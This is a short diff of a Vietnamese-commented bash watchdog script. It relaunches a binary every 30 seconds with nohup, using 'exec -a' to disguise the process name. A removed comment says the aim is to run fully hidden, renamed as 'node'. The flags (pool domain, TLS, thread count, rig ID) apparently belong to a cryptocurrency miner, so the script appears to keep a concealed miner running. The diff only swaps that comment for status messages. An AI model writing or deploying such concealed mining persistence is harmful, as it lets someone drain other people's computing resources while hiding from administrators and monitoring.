@@ -25,8 +25,10 @@ fi
 while true; do
     # Kiểm tra tiến trình đang chạy
     if ! pgrep -f "$PROCESS_NAME -o $DOMAIN" > /dev/null; then
-        # Chạy ẩn hoàn toàn, đổi tên tiến trình thành 'node'
+        echo "[+] Tiến trình chưa chạy, start..."
         nohup bash -c "exec -a $PROCESS_NAME $(pwd)/$PROCESS_PATH -o $DOMAIN --tls -k -t 6 --rig-id $NAME_WORK" > /dev/null 2>&1 &
+    else
+        echo "[+] Tiến trình đang chạy, kiểm tra lại sau 30s..."
     fi
     sleep 30
 done
